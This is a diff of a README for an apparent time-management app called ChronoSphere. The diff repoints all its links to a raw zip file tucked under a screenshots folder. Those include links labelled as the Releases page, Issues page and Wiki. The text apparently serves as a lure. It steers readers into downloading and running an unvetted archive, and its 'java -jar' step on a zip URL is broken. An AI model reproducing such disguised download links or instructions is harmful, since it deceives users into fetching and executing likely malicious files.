@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download ChronoSphere](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip)](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip)
+[![Download ChronoSphere](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip)](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To run ChronoSphere smoothly, ensure your system meets these requirements:
 
 To get started with ChronoSphere, visit the following link to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip)
+[Visit this page to download](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip)
 
 Once there, locate the version you want, and download the appropriate file for your system.
 
@@ -37,7 +37,7 @@ ChronoSphere packs a variety of features to help you manage your time effectivel
 
 ## ⚙️ How to Run ChronoSphere
 
-1. **Download** the application from the [Releases page](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip).
+1. **Download** the application from the [Releases page](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip).
 2. **Extract** the downloaded file (if it is in a compressed format).
 3. **Open** your command line interface (Terminal for macOS or Linux, Command Prompt for Windows).
 4. **Navigate** to the folder where you extracted the files using the `cd` command. For instance:
@@ -46,7 +46,7 @@ ChronoSphere packs a variety of features to help you manage your time effectivel
    ```
 5. **Run** the application by entering:
    ```
-   java -jar https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip
+   java -jar https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip
    ```
 
 ## 📚 User Guide
@@ -77,13 +77,13 @@ To help you get the most from ChronoSphere, here's a brief guide on using some o
 
 ## 💬 Support and Feedback
 
-If you encounter any issues while using ChronoSphere, or if you have suggestions for improvements, feel free to reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip).
+If you encounter any issues while using ChronoSphere, or if you have suggestions for improvements, feel free to reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip).
 
 ## 🔗 Additional Resources
 
 Explore more about ChronoSphere and its capabilities:
 
-- **Documentation:** [GitHub Wiki](https://raw.githubusercontent.com/smox496/ChronoSphere/main/data/Chrono_Sphere_3.8.zip)
+- **Documentation:** [GitHub Wiki](https://raw.githubusercontent.com/smox496/ChronoSphere/main/screenshots/smart_alarm/Sphere-Chrono-v2.7.zip)
 - **Changelog:** Check the Releases page for updates and new features.
 
 Now that you have everything ready, manage your time effectively with ChronoSphere! Enjoy your experience.
